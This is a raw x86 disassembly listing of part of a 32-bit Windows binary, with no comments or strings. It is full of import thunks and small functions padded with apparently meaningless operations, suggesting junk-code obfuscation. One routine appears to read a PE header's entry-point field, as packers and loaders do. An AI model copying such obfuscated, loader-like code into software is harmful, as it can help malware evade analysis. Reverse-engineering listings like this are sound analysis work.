  4d07a2:	call   0x4d120c
  4d07a7:	add    esp,0xc
  4d07aa:	pop    ebx
  4d07ab:	mov    esi,0x4d2018
  4d07b0:	mov    esi,DWORD PTR [esi]
  4d07b2:	push   esi
  4d07b3:	push   DWORD PTR [ebx+0x68]
  4d07b6:	pop    edx
  4d07b7:	call   edx
  4d07b9:	add    esp,0x58
  4d07bc:	pop    ebp
  4d07bd:	ret    
  4d07be:	add    BYTE PTR [eax],al
  4d07c0:	pop    edi
  4d07c1:	call   DWORD PTR ds:0x4d2034
  4d07c7:	call   edi
  4d07c9:	add    BYTE PTR [eax],al
  4d07cb:	add    BYTE PTR [edi-0x1],bl
  4d07ce:	adc    eax,0x4d20a0
  4d07d3:	call   edi
  4d07d5:	add    BYTE PTR [eax],al
  4d07d7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d07dd:	sub    esp,0x50
  4d07e0:	lea    ebx,ds:0x4d31fc
  4d07e6:	cmp    ebx,0x764f
  4d07ec:	je     0x4d07db
  4d07ee:	push   ebx
  4d07ef:	push   DWORD PTR [ebx+0x1bc]
  4d07f5:	push   DWORD PTR [ebx+0x10]
  4d07f8:	call   0x4d1568
  4d07fd:	add    esp,0x8
  4d0800:	pop    ebx
  4d0801:	mov    edx,0x0
  4d0806:	push   edx
  4d0807:	call   0x4d1254
  4d080c:	add    esp,0x4
  4d080f:	push   0x0
  4d0811:	call   0x4d106c
  4d0816:	add    esp,0x4
  4d0819:	add    esp,0x50
  4d081c:	pop    ebp
  4d081d:	ret    
  4d081e:	add    BYTE PTR [eax],al
  4d0820:	pop    edi
  4d0821:	call   DWORD PTR ds:0x4d2040
  4d0827:	call   edi
  4d0829:	add    BYTE PTR [eax],al
  4d082b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0831:	sub    esp,0x38
  4d0834:	lea    ebx,[edi-0x58]
  4d0837:	mov    DWORD PTR [ebp-0xc],edi
  4d083a:	mov    esi,0x0
  4d083f:	push   esi
  4d0840:	call   0x4d0a1c
  4d0845:	add    esp,0x4
  4d0848:	push   ebx
  4d0849:	push   DWORD PTR [ebx+0x1c8]
  4d084f:	push   DWORD PTR [ebx+0x180]
  4d0855:	call   0x4d1320
  4d085a:	add    esp,0x8
  4d085d:	pop    ebx
  4d085e:	mov    ecx,0x0
  4d0863:	push   ecx
  4d0864:	call   0x4d1254
  4d0869:	add    esp,0x4
  4d086c:	add    esp,0x38
  4d086f:	pop    ebp
  4d0870:	ret    
  4d0871:	add    BYTE PTR [eax],al
  4d0873:	add    BYTE PTR [edi-0x1],bl
  4d0876:	adc    eax,0x4d207c
  4d087b:	call   edi
  4d087d:	add    BYTE PTR [eax],al
  4d087f:	add    BYTE PTR [edi-0x1],bl
  4d0882:	adc    eax,0x4d2054
  4d0887:	call   edi
  4d0889:	add    BYTE PTR [eax],al
  4d088b:	add    BYTE PTR [edi-0x1],bl
  4d088e:	adc    eax,0x4d2074
  4d0893:	call   edi
  4d0895:	add    BYTE PTR [eax],al
  4d0897:	add    BYTE PTR [edi-0x1],bl
  4d089a:	adc    eax,0x4d2048
  4d089f:	call   edi
  4d08a1:	add    BYTE PTR [eax],al
  4d08a3:	add    BYTE PTR [edi-0x1],bl
  4d08a6:	adc    eax,0x4d2098
  4d08ab:	call   edi
  4d08ad:	add    BYTE PTR [eax],al
  4d08af:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d08b5:	sub    esp,0x4c
  4d08b8:	lea    esi,[ebx+0x178]
  4d08be:	sub    ebx,DWORD PTR [esi-0x80]
  4d08c4:	push   esi
  4d08c5:	push   DWORD PTR [esi+0xc]
  4d08c8:	push   DWORD PTR [esi+0x10]
  4d08cb:	call   0x4d1528
  4d08d0:	add    esp,0x8
  4d08d3:	pop    esi
  4d08d4:	mov    edi,0x0
  4d08d9:	push   edi
  4d08da:	call   0x4d0a1c
  4d08df:	add    esp,0x4
  4d08e2:	mov    edx,0x0
  4d08e7:	push   edx
  4d08e8:	call   0x4d106c
  4d08ed:	add    esp,0x4
  4d08f0:	add    esp,0x4c
  4d08f3:	pop    ebp
  4d08f4:	ret    
  4d08f5:	add    BYTE PTR [eax],al
  4d08f7:	add    BYTE PTR [edi-0x1],bl
  4d08fa:	adc    eax,0x4d2010
  4d08ff:	call   edi
  4d0901:	add    BYTE PTR [eax],al
  4d0903:	add    BYTE PTR [edi-0x1],bl
  4d0906:	adc    eax,0x4d2088
  4d090b:	call   edi
  4d090d:	add    BYTE PTR [eax],al
  4d090f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0915:	sub    esp,0x3c
  4d0918:	mov    edx,0x4d3028
  4d091d:	or     ecx,esi
  4d091f:	push   edx
  4d0920:	mov    esi,0x0
  4d0925:	push   esi
  4d0926:	call   0x4d1010
  4d092b:	add    esp,0x4
  4d092e:	pop    edx
  4d092f:	push   edx
  4d0930:	push   esi
  4d0931:	push   DWORD PTR [edx+0x148]
  4d0937:	call   0x4d149c
  4d093c:	add    esp,0x8
  4d093f:	pop    edx
  4d0940:	push   edx
  4d0941:	push   0x0
  4d0943:	call   0x4d09f8
  4d0948:	add    esp,0x4
  4d094b:	pop    edx
  4d094c:	add    esp,0x3c
  4d094f:	pop    ebp
  4d0950:	ret    
  4d0951:	add    BYTE PTR [eax],al
  4d0953:	add    BYTE PTR [edi-0x1],bl
  4d0956:	adc    eax,0x4d2090
  4d095b:	call   edi
  4d095d:	add    BYTE PTR [eax],al
  4d095f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0965:	sub    esp,0x58
  4d0968:	lea    edi,ds:0x4d30d0
  4d096e:	xor    DWORD PTR [ebp-0x28],0x76fd
  4d0975:	push   edi
  4d0976:	push   0x0
  4d0978:	call   0x4d09f8
  4d097d:	add    esp,0x4
  4d0980:	pop    edi
  4d0981:	push   edi
  4d0982:	push   DWORD PTR [edi+0x13c]
  4d0988:	push   eax
  4d0989:	call   0x4d0738
  4d098e:	add    esp,0x8
  4d0991:	pop    edi
  4d0992:	push   edi
  4d0993:	push   0x0
  4d0995:	call   0x4d106c
  4d099a:	add    esp,0x4
  4d099d:	pop    edi
  4d099e:	add    esp,0x58
  4d09a1:	pop    ebp
  4d09a2:	ret    
  4d09a3:	add    BYTE PTR [edi-0x1],bl
  4d09a6:	adc    eax,0x4d2084
  4d09ab:	call   edi
  4d09ad:	add    BYTE PTR [eax],al
  4d09af:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d09b5:	sub    esp,0x5c
  4d09b8:	lea    edi,ds:0x4d3160
  4d09be:	or     DWORD PTR [edi+0x8],edx
  4d09c1:	push   edi
  4d09c2:	mov    ebx,0x0
  4d09c7:	push   ebx
  4d09c8:	call   0x4d0a1c
  4d09cd:	add    esp,0x4
  4d09d0:	pop    edi
  4d09d1:	push   edi
  4d09d2:	push   eax
  4d09d3:	push   DWORD PTR [edi+0xf8]
  4d09d9:	call   0x4d14d4
  4d09de:	add    esp,0x8
  4d09e1:	pop    edi
  4d09e2:	push   edi
  4d09e3:	mov    esi,0x0
  4d09e8:	push   esi
  4d09e9:	call   0x4d106c
  4d09ee:	add    esp,0x4
  4d09f1:	pop    edi
  4d09f2:	add    esp,0x5c
  4d09f5:	pop    ebp
  4d09f6:	ret    
  4d09f7:	add    BYTE PTR [edi-0x1],bl
  4d09fa:	adc    eax,0x4d2014
  4d09ff:	call   edi
  4d0a01:	add    BYTE PTR [eax],al
  4d0a03:	add    BYTE PTR [edi-0x1],bl
  4d0a06:	adc    eax,0x4d2070
  4d0a0b:	call   edi
  4d0a0d:	add    BYTE PTR [eax],al
  4d0a0f:	add    BYTE PTR [edi-0x1],bl
  4d0a12:	adc    eax,0x4d209c
  4d0a17:	call   edi
  4d0a19:	add    BYTE PTR [eax],al
  4d0a1b:	add    BYTE PTR [edi-0x1],bl
  4d0a1e:	adc    eax,0x4d2078
  4d0a23:	call   edi
  4d0a25:	add    BYTE PTR [eax],al
  4d0a27:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0a2d:	sub    esp,0x48
  4d0a30:	mov    ebx,0x4d30d0
  4d0a35:	and    DWORD PTR [ebx+0x20],edi
  4d0a38:	push   ebx
  4d0a39:	push   edx
  4d0a3a:	push   DWORD PTR [ebx+0x4c]
  4d0a3d:	push   edx
  4d0a3e:	push   DWORD PTR [ebx+0xf4]
  4d0a44:	call   0x4d0ae4
  4d0a49:	add    esp,0x10
  4d0a4c:	pop    ebx
  4d0a4d:	push   0x0
  4d0a4f:	call   0x4d1254
  4d0a54:	add    esp,0x4
  4d0a57:	mov    ecx,0x0
  4d0a5c:	push   ecx
  4d0a5d:	call   0x4d1010
  4d0a62:	add    esp,0x4
  4d0a65:	add    esp,0x48
  4d0a68:	pop    ebp
  4d0a69:	ret    
  4d0a6a:	add    BYTE PTR [eax],al
  4d0a6c:	pop    edi
  4d0a6d:	call   DWORD PTR ds:0x4d2020
  4d0a73:	call   edi
  4d0a75:	add    BYTE PTR [eax],al
  4d0a77:	add    BYTE PTR [edi-0x1],bl
  4d0a7a:	adc    eax,0x4d2060
  4d0a7f:	call   edi
  4d0a81:	add    BYTE PTR [eax],al
  4d0a83:	add    BYTE PTR [edi-0x1],bl
  4d0a86:	adc    eax,0x4d2064
  4d0a8b:	call   edi
  4d0a8d:	add    BYTE PTR [eax],al
  4d0a8f:	add    BYTE PTR [edi-0x1],bl
  4d0a92:	adc    eax,0x4d200c
  4d0a97:	call   edi
  4d0a99:	add    BYTE PTR [eax],al
  4d0a9b:	add    BYTE PTR [edi+0x2b],dl
  4d0a9e:	call   DWORD PTR [edi+0x57]
  4d0aa1:	push   edi
  4d0aa2:	push   edi
  4d0aa3:	call   0x4d1078
  4d0aa8:	sub    esp,0xfffffffc
  4d0aab:	call   0x4d0a6c
  4d0ab0:	push   0x2
  4d0ab2:	xor    eax,eax
  4d0ab4:	dec    eax
  4d0ab5:	and    eax,0x4d3030
  4d0aba:	push   0x0
  4d0abc:	lea    ecx,[eax+0x6]
  4d0abf:	add    BYTE PTR [ecx],0x41
  4d0ac2:	push   eax
  4d0ac3:	call   0x4d12dc
  4d0ac8:	pop    edi
  4d0ac9:	pop    edi
  4d0aca:	pop    edi
  4d0acb:	lea    edi,[eax+0x3b]
  4d0ace:	mov    edi,DWORD PTR [edi]
  4d0ad0:	lea    eax,[eax+edi*1]
  4d0ad3:	mov    eax,DWORD PTR [eax+0x28]
  4d0ad6:	pusha  
  4d0ad7:	mov    ah,0x45
  4d0ad9:	sub    al,ah
  4d0adb:	ja     0x4d0774
  4d0ae1:	popa   
  4d0ae2:	ret    
  4d0ae3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0ae9:	sub    esp,0x28
  4d0aec:	mov    edx,0x4d31ac
  4d0af1:	and    DWORD PTR [edx+0x24],0x41
  4d0af5:	push   edx
  4d0af6:	push   eax
  4d0af7:	push   ebx
  4d0af8:	push   DWORD PTR [edx+0x154]
  4d0afe:	push   DWORD PTR [edx+0x140]
  4d0b04:	call   0x4d1084
  4d0b09:	add    esp,0x10
  4d0b0c:	pop    edx
  4d0b0d:	push   edx
  4d0b0e:	push   0x0
  4d0b10:	call   0x4d11b0
  4d0b15:	add    esp,0x4
  4d0b18:	pop    edx
  4d0b19:	push   edx
  4d0b1a:	push   0x0
  4d0b1c:	call   0x4d09f8
  4d0b21:	add    esp,0x4
  4d0b24:	pop    edx
  4d0b25:	add    esp,0x28
  4d0b28:	pop    ebp
  4d0b29:	ret    
  4d0b2a:	add    BYTE PTR [eax],al
  4d0b2c:	mov    edi,edi
  4d0b2e:	push   ebp
  4d0b2f:	mov    ebp,esp
  4d0b31:	sub    esp,0x28
  4d0b34:	lea    eax,ds:0x4d3138
  4d0b3a:	mov    ebx,DWORD PTR [ebp-0x4]
  4d0b3d:	push   eax
  4d0b3e:	push   0xfffffff4
  4d0b40:	call   0x4d0c38
  4d0b45:	add    esp,0x4
  4d0b48:	pop    eax
  4d0b49:	push   eax
  4d0b4a:	push   edx
  4d0b4b:	push   DWORD PTR [eax+0x4c]
  4d0b4e:	push   ecx
  4d0b4f:	push   esi
  4d0b50:	call   0x4d0fd0
  4d0b55:	add    esp,0x10
  4d0b58:	pop    eax
  4d0b59:	push   eax
  4d0b5a:	call   0x4d0820
  4d0b5f:	add    esp,0x4
  4d0b62:	pop    eax
  4d0b63:	add    esp,0x28
  4d0b66:	pop    ebp
  4d0b67:	ret    
  4d0b68:	mov    edi,edi
  4d0b6a:	push   ebp
  4d0b6b:	mov    ebp,esp
  4d0b6d:	sub    esp,0x54
  4d0b70:	lea    esi,ds:0x4d30d4
  4d0b76:	or     edx,edi
  4d0b78:	mov    edi,0x0
  4d0b7d:	push   edi
  4d0b7e:	call   0x4d11b0
  4d0b83:	add    esp,0x4
  4d0b86:	push   esi
  4d0b87:	push   DWORD PTR [esi+0x10c]
  4d0b8d:	push   eax
  4d0b8e:	push   DWORD PTR [esi+0x38]
  4d0b91:	call   0x4d09b0
  4d0b96:	add    esp,0xc
  4d0b99:	pop    esi
  4d0b9a:	push   0x0
  4d0b9c:	call   0x4d1010
  4d0ba1:	add    esp,0x4
  4d0ba4:	add    esp,0x54
  4d0ba7:	pop    ebp
  4d0ba8:	ret    
  4d0ba9:	add    BYTE PTR [eax],al
  4d0bab:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0bb1:	sub    esp,0x24
  4d0bb4:	lea    ebx,ds:0x4d3078
  4d0bba:	adc    eax,0xffffe7eb
  4d0bbf:	push   ebx
  4d0bc0:	push   ecx
  4d0bc1:	push   edi
  4d0bc2:	call   0x4d0ce8
  4d0bc7:	add    esp,0x8
  4d0bca:	pop    ebx
  4d0bcb:	push   0x0
  4d0bcd:	call   0x4d0898
  4d0bd2:	add    esp,0x4
  4d0bd5:	mov    edi,0x0
  4d0bda:	push   edi
  4d0bdb:	call   0x4d11b0
  4d0be0:	add    esp,0x4
  4d0be3:	add    esp,0x24
  4d0be6:	pop    ebp
  4d0be7:	ret    
  4d0be8:	mov    edi,edi
  4d0bea:	push   ebp
  4d0beb:	mov    ebp,esp
  4d0bed:	sub    esp,0x3c
  4d0bf0:	lea    ecx,ds:0x4d30d8
  4d0bf6:	and    ebx,0x16c5
  4d0bfc:	push   ecx
  4d0bfd:	mov    ecx,0x0
  4d0c02:	push   ecx
  4d0c03:	call   0x4d106c
  4d0c08:	add    esp,0x4
  4d0c0b:	pop    ecx
  4d0c0c:	push   ecx
  4d0c0d:	push   DWORD PTR [ecx+0x13c]
  4d0c13:	push   ebx
  4d0c14:	push   DWORD PTR [ecx+0x50]
  4d0c17:	call   0x4d0a28
  4d0c1c:	add    esp,0xc
  4d0c1f:	pop    ecx
  4d0c20:	push   ecx
  4d0c21:	mov    ebx,0x0
  4d0c26:	push   ebx
  4d0c27:	call   0x4d1254
  4d0c2c:	add    esp,0x4
  4d0c2f:	pop    ecx
  4d0c30:	add    esp,0x3c
  4d0c33:	pop    ebp
  4d0c34:	ret    
  4d0c35:	add    BYTE PTR [eax],al
  4d0c37:	add    BYTE PTR [edi-0x1],bl
  4d0c3a:	adc    eax,0x4d2038
  4d0c3f:	call   edi
  4d0c41:	add    BYTE PTR [eax],al
  4d0c43:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0c49:	sub    esp,0x40
  4d0c4c:	lea    edi,ds:0x4d3124
  4d0c52:	or     edx,DWORD PTR [ebp-0x30]
  4d0c55:	push   edi
  4d0c56:	push   DWORD PTR [edi+0xc8]
  4d0c5c:	push   eax
  4d0c5d:	push   eax
  4d0c5e:	push   DWORD PTR [edi+0x88]
  4d0c64:	call   0x4d082c
  4d0c69:	add    esp,0x10
  4d0c6c:	pop    edi
  4d0c6d:	push   edi
  4d0c6e:	lea    eax,[edi-0x124]
  4d0c74:	push   eax
  4d0c75:	call   0x4d151c
  4d0c7a:	add    esp,0x4
  4d0c7d:	test   eax,eax
  4d0c7f:	jne    0x4d0c6e
  4d0c81:	pop    edi
  4d0c82:	push   edi
  4d0c83:	mov    esi,0x0
  4d0c88:	push   esi
  4d0c89:	call   0x4d1010
  4d0c8e:	add    esp,0x4
  4d0c91:	pop    edi
  4d0c92:	add    esp,0x40
  4d0c95:	pop    ebp
  4d0c96:	ret    
  4d0c97:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0c9d:	sub    esp,0x1c
  4d0ca0:	lea    eax,[ebx-0xb0]
  4d0ca6:	adc    edi,0x19
  4d0ca9:	push   eax
  4d0caa:	mov    eax,0x0
  4d0caf:	push   eax
  4d0cb0:	call   0x4d11b0
  4d0cb5:	add    esp,0x4
  4d0cb8:	pop    eax
  4d0cb9:	push   eax
  4d0cba:	push   ebx
  4d0cbb:	push   DWORD PTR [eax+0xf4]
  4d0cc1:	push   DWORD PTR [eax+0x118]
  4d0cc7:	call   0x4d0de8
  4d0ccc:	add    esp,0xc
  4d0ccf:	pop    eax
  4d0cd0:	push   eax
  4d0cd1:	mov    ecx,0x0
  4d0cd6:	push   ecx
  4d0cd7:	call   0x4d0f38
  4d0cdc:	add    esp,0x4
  4d0cdf:	pop    eax
  4d0ce0:	add    esp,0x1c
  4d0ce3:	pop    ebp
  4d0ce4:	ret    
  4d0ce5:	add    BYTE PTR [eax],al
  4d0ce7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0ced:	sub    esp,0x2c
  4d0cf0:	lea    ecx,ds:0x4d30ac
  4d0cf6:	cmp    ecx,0x3576
  4d0cfc:	jb     0x4d0ceb
  4d0cfe:	push   ecx
  4d0cff:	push   DWORD PTR [ecx+0x50]
  4d0d02:	push   ebx
  4d0d03:	call   0x4d12e8
  4d0d08:	add    esp,0x8
  4d0d0b:	pop    ecx
  4d0d0c:	push   ecx
  4d0d0d:	lea    edi,[ecx-0xac]
  4d0d13:	push   edi
  4d0d14:	call   0x4d151c
  4d0d19:	add    esp,0x4
  4d0d1c:	test   eax,eax
  4d0d1e:	jne    0x4d0d0d
  4d0d20:	pop    ecx
  4d0d21:	push   ecx
  4d0d22:	mov    ebx,0x0
  4d0d27:	push   ebx
  4d0d28:	call   0x4d0f38
  4d0d2d:	add    esp,0x4
  4d0d30:	pop    ecx
  4d0d31:	add    esp,0x2c
  4d0d34:	pop    ebp
  4d0d35:	ret    
  4d0d36:	add    BYTE PTR [eax],al
  4d0d38:	pop    edi
  4d0d39:	call   DWORD PTR ds:0x4d205c
  4d0d3f:	call   edi
  4d0d41:	add    BYTE PTR [eax],al
  4d0d43:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0d49:	sub    esp,0x58
  4d0d4c:	lea    edx,ds:0x4d3004
  4d0d52:	adc    ebx,0x4e
  4d0d55:	push   edx
  4d0d56:	push   ebx
  4d0d57:	push   DWORD PTR [edx+0x1a8]
  4d0d5d:	call   0x4d0f90
  4d0d62:	add    esp,0x8
  4d0d65:	pop    edx
  4d0d66:	push   edx
  4d0d67:	push   0x0
  4d0d69:	call   0x4d0a1c
  4d0d6e:	add    esp,0x4
  4d0d71:	pop    edx
  4d0d72:	push   edx
  4d0d73:	lea    ecx,[edx-0x4]
  4d0d76:	push   ecx
  4d0d77:	call   0x4d151c
  4d0d7c:	add    esp,0x4
  4d0d7f:	test   eax,eax
  4d0d81:	jne    0x4d0d73
  4d0d83:	pop    edx
  4d0d84:	add    esp,0x58
  4d0d87:	pop    ebp
  4d0d88:	ret    
  4d0d89:	add    BYTE PTR [eax],al
  4d0d8b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0d91:	sub    esp,0x24
  4d0d94:	lea    edx,[ecx+0xb0]
  4d0d9a:	sub    DWORD PTR [edx-0x1e0],0xffffb3fe
  4d0da4:	push   edx
  4d0da5:	push   eax
  4d0da6:	push   ecx
  4d0da7:	push   esi
  4d0da8:	push   ecx
  4d0da9:	call   0x4d12a0
  4d0dae:	add    esp,0x10
  4d0db1:	pop    edx
  4d0db2:	push   edx
  4d0db3:	lea    ecx,[edx-0x1e0]
  4d0db9:	push   ecx
  4d0dba:	call   0x4d151c
  4d0dbf:	add    esp,0x4
  4d0dc2:	test   eax,eax
  4d0dc4:	jne    0x4d0db3
  4d0dc6:	pop    edx
  4d0dc7:	push   edx
  4d0dc8:	mov    ebx,0x0
  4d0dcd:	push   ebx
  4d0dce:	call   0x4d11b0
  4d0dd3:	add    esp,0x4
  4d0dd6:	pop    edx
  4d0dd7:	add    esp,0x24
  4d0dda:	pop    ebp
  4d0ddb:	ret    
  4d0ddc:	pop    edi
  4d0ddd:	call   DWORD PTR ds:0x4d2028
  4d0de3:	call   edi
  4d0de5:	add    BYTE PTR [eax],al
  4d0de7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0ded:	sub    esp,0x24
  4d0df0:	lea    edx,[eax+0x10]
  4d0df3:	adc    esi,DWORD PTR [ebp-0x20]
  4d0df6:	push   edx
  4d0df7:	mov    edi,0x0
  4d0dfc:	push   edi
  4d0dfd:	call   0x4d10c8
  4d0e02:	add    esp,0x4
  4d0e05:	pop    edx
  4d0e06:	push   edx
  4d0e07:	push   ecx
  4d0e08:	push   DWORD PTR [edx+0x34]
  4d0e0b:	push   DWORD PTR [edx+0x1c0]
  4d0e11:	push   DWORD PTR [edx+0x140]
  4d0e17:	call   0x4d101c
  4d0e1c:	add    esp,0x10
  4d0e1f:	pop    edx
  4d0e20:	push   edx
  4d0e21:	push   0x0
  4d0e23:	call   0x4d10c8
  4d0e28:	add    esp,0x4
  4d0e2b:	pop    edx
  4d0e2c:	add    esp,0x24
  4d0e2f:	pop    ebp
  4d0e30:	ret    
  4d0e31:	add    BYTE PTR [eax],al
  4d0e33:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0e39:	sub    esp,0x20
  4d0e3c:	lea    eax,[edi+0x164]
  4d0e42:	xor    DWORD PTR [eax+0x40],0xffffffd3
  4d0e46:	push   eax
  4d0e47:	push   ebx
  4d0e48:	push   DWORD PTR [eax+0x10c]
  4d0e4e:	call   0x4d1404
  4d0e53:	add    esp,0x8
  4d0e56:	pop    eax
  4d0e57:	push   eax
  4d0e58:	mov    esi,0x0
  4d0e5d:	push   esi
  4d0e5e:	call   0x4d106c
  4d0e63:	add    esp,0x4
  4d0e66:	pop    eax
  4d0e67:	push   eax
  4d0e68:	push   0x0
  4d0e6a:	call   0x4d10c8
  4d0e6f:	add    esp,0x4
  4d0e72:	pop    eax
  4d0e73:	add    esp,0x20
  4d0e76:	pop    ebp
  4d0e77:	ret    
  4d0e78:	pop    edi
  4d0e79:	call   DWORD PTR ds:0x4d2030
  4d0e7f:	call   edi
  4d0e81:	add    BYTE PTR [eax],al
  4d0e83:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0e89:	sub    esp,0x48
  4d0e8c:	mov    ebx,0x4d3064
  4d0e91:	cmp    ebx,0x54b7
  4d0e97:	jb     0x4d0e87
  4d0e99:	call   0x4d0e78
  4d0e9e:	add    esp,0x4
  4d0ea1:	push   ebx
  4d0ea2:	push   DWORD PTR [ebx+0x24]
  4d0ea5:	push   DWORD PTR [ebx+0xe0]
  4d0eab:	call   0x4d08b0
  4d0eb0:	add    esp,0x8
  4d0eb3:	pop    ebx
  4d0eb4:	lea    eax,[ebx-0x64]
  4d0eb7:	push   eax
  4d0eb8:	call   0x4d151c
  4d0ebd:	add    esp,0x4
  4d0ec0:	test   eax,eax
  4d0ec2:	jne    0x4d0eb5
  4d0ec4:	add    esp,0x48
  4d0ec7:	pop    ebp
  4d0ec8:	ret    
  4d0ec9:	add    BYTE PTR [eax],al
  4d0ecb:	add    BYTE PTR [edi-0x1],bl
  4d0ece:	adc    eax,0x4d208c
  4d0ed3:	call   edi
  4d0ed5:	add    BYTE PTR [eax],al
  4d0ed7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0edd:	sub    esp,0x38
  4d0ee0:	lea    edi,[eax-0x94]
  4d0ee6:	cmp    edi,0x6b6e
  4d0eec:	je     0x4d0edb
  4d0eee:	push   edi
  4d0eef:	push   esi
  4d0ef0:	push   DWORD PTR [edi+0xbc]
  4d0ef6:	push   esi
  4d0ef7:	call   0x4d0b2c
  4d0efc:	add    esp,0xc
  4d0eff:	pop    edi
  4d0f00:	push   edi
  4d0f01:	mov    eax,0x0
  4d0f06:	push   eax
  4d0f07:	call   0x4d0a90
  4d0f0c:	add    esp,0x4
  4d0f0f:	pop    edi
  4d0f10:	push   edi
  4d0f11:	call   0x4d0e78
  4d0f16:	add    esp,0x4
  4d0f19:	pop    edi
  4d0f1a:	add    esp,0x38
  4d0f1d:	pop    ebp
  4d0f1e:	ret    
  4d0f1f:	add    BYTE PTR [edi-0x1],bl
  4d0f22:	adc    eax,0x4d201c
  4d0f27:	call   edi
  4d0f29:	add    BYTE PTR [eax],al
  4d0f2b:	add    BYTE PTR [edi-0x1],bl
  4d0f2e:	adc    eax,0x4d2094
  4d0f33:	call   edi
  4d0f35:	add    BYTE PTR [eax],al
  4d0f37:	add    BYTE PTR [edi-0x1],bl
  4d0f3a:	adc    eax,0x4d202c
  4d0f3f:	call   edi
  4d0f41:	add    BYTE PTR [eax],al
  4d0f43:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0f49:	sub    esp,0x48
  4d0f4c:	lea    eax,[ecx-0xf8]
  4d0f52:	and    DWORD PTR [ebp-0x28],ebx
  4d0f55:	push   eax
  4d0f56:	push   DWORD PTR [eax+0xf0]
  4d0f5c:	push   DWORD PTR [eax+0xac]
  4d0f62:	push   DWORD PTR [eax+0x58]
  4d0f65:	call   0x4d0be8
  4d0f6a:	add    esp,0xc
  4d0f6d:	pop    eax
  4d0f6e:	push   eax
  4d0f6f:	mov    eax,0x0
  4d0f74:	push   eax
  4d0f75:	call   0x4d1254
  4d0f7a:	add    esp,0x4
  4d0f7d:	pop    eax
  4d0f7e:	push   eax
  4d0f7f:	push   0x0
  4d0f81:	call   0x4d11b0
  4d0f86:	add    esp,0x4
  4d0f89:	pop    eax
  4d0f8a:	add    esp,0x48
  4d0f8d:	pop    ebp
  4d0f8e:	ret    
  4d0f8f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0f95:	sub    esp,0x40
  4d0f98:	lea    ecx,ds:0x4d3190
  4d0f9e:	add    edx,DWORD PTR [ebp-0x40]
  4d0fa1:	push   ecx
  4d0fa2:	push   0x0
  4d0fa4:	call   0x4d0a90
  4d0fa9:	add    esp,0x4
  4d0fac:	pop    ecx
  4d0fad:	push   ecx
  4d0fae:	push   ebx
  4d0faf:	push   edi
  4d0fb0:	push   DWORD PTR [ecx+0xd4]
  4d0fb6:	call   0x4d1440
  4d0fbb:	add    esp,0xc
  4d0fbe:	pop    ecx
  4d0fbf:	push   ecx
  4d0fc0:	push   0x0
  4d0fc2:	call   0x4d106c
  4d0fc7:	add    esp,0x4
  4d0fca:	pop    ecx
  4d0fcb:	add    esp,0x40
  4d0fce:	pop    ebp
  4d0fcf:	ret    
  4d0fd0:	mov    edi,edi
  4d0fd2:	push   ebp
  4d0fd3:	mov    ebp,esp
  4d0fd5:	sub    esp,0x48
  4d0fd8:	lea    ecx,[eax-0x1c]
  4d0fdb:	adc    DWORD PTR [ebp-0x44],eax
  4d0fde:	push   ecx
  4d0fdf:	call   0x4d0e78
  4d0fe4:	add    esp,0x4
  4d0fe7:	pop    ecx
  4d0fe8:	push   ecx
  4d0fe9:	push   DWORD PTR [ecx+0x1e0]
  4d0fef:	push   DWORD PTR [ecx+0x80]
  4d0ff5:	push   edi
  4d0ff6:	call   0x4d0f44
  4d0ffb:	add    esp,0xc
  4d0ffe:	pop    ecx
  4d0fff:	push   ecx
  4d1000:	call   0x4d0e78
  4d1005:	add    esp,0x4
  4d1008:	pop    ecx
  4d1009:	add    esp,0x48
  4d100c:	pop    ebp
  4d100d:	ret    
  4d100e:	add    BYTE PTR [eax],al
  4d1010:	pop    edi
  4d1011:	call   DWORD PTR ds:0x4d2068
  4d1017:	call   edi
  4d1019:	add    BYTE PTR [eax],al
  4d101b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1021:	sub    esp,0x34
  4d1024:	lea    edi,[edx-0x80]
  4d102a:	sub    DWORD PTR [edi-0x94],edi
  4d1030:	push   edi
  4d1031:	push   DWORD PTR [edi+0x178]
  4d1037:	push   DWORD PTR [edi+0x118]
  4d103d:	push   DWORD PTR [edi+0x180]
  4d1043:	call   0x4d0e84
  4d1048:	add    esp,0xc
  4d104b:	pop    edi
  4d104c:	push   edi
  4d104d:	push   0x0
  4d104f:	call   0x4d1010
  4d1054:	add    esp,0x4
  4d1057:	pop    edi
  4d1058:	push   edi
  4d1059:	push   0xfffffff4
  4d105b:	call   0x4d0c38
  4d1060:	add    esp,0x4
  4d1063:	pop    edi
  4d1064:	add    esp,0x34
  4d1067:	pop    ebp
  4d1068:	ret    
  4d1069:	add    BYTE PTR [eax],al
  4d106b:	add    BYTE PTR [edi-0x1],bl
  4d106e:	adc    eax,0x4d2000
  4d1073:	call   edi
  4d1075:	add    BYTE PTR [eax],al
  4d1077:	add    BYTE PTR [edi-0x1],bl
  4d107a:	adc    eax,0x4d2008
  4d107f:	call   edi
  4d1081:	add    BYTE PTR [eax],al
  4d1083:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1089:	sub    esp,0x58
  4d108c:	lea    edi,ds:0x4d3014
  4d1092:	add    DWORD PTR [ebp-0x44],0x3a
  4d1096:	push   edi
  4d1097:	push   edx
  4d1098:	push   DWORD PTR [edi+0x1cc]
  4d109e:	push   esi
  4d109f:	push   DWORD PTR [edi+0x10]
  4d10a2:	call   0x4d0e34
  4d10a7:	add    esp,0x10
  4d10aa:	pop    edi
  4d10ab:	push   edi
  4d10ac:	push   0x0
  4d10ae:	call   0x4d106c
  4d10b3:	add    esp,0x4
  4d10b6:	pop    edi
  4d10b7:	push   edi
